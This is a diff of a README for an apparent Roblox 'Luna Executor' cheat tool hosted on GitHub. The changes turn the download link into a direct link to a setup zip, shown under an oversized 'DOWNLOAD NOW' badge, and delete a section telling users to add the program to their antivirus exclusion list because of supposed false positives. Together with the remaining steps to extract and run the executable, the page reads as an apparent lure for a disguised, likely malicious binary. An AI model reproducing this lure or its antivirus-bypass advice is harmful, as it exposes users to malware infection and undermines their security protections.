@@ -10,9 +10,8 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/tag/luna-download" target="_blank">
-    <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/gradient.png" width="100%" height="6px" /></br>
-    <img src="https://img.shields.io/badge/DOWNLOAD-LUNA%20EXECUTOR-brightgreen?style=for-the-badge&logo=windows&logoColor=white" height="45" />
+  <a href="[https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/download/luna-download/Setup-win32-x64.zip](https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/tag/luna-download)">
+    <img src="https://img.shields.io/badge/►_DOWNLOAD_NOW-238636?style=for-the-badge&logo=github&logoColor=white" width="1000" height="500" />
   </a>
 </p>
 
@@ -30,8 +29,3 @@
 3. Extract the contents to a secure folder on your local drive.
 4. Launch the main executable and follow the on-screen configuration wizard.
 
-## 🔒 Security & False Positives
-> [!WARNING]
-> Due to the nature of compilation and memory-linking techniques used by execution software, some security suites or windows protection systems might flag the application as a "False Positive". 
-> 
-> If this occurs, you may need to add the application directory to your security software's exclusion list.
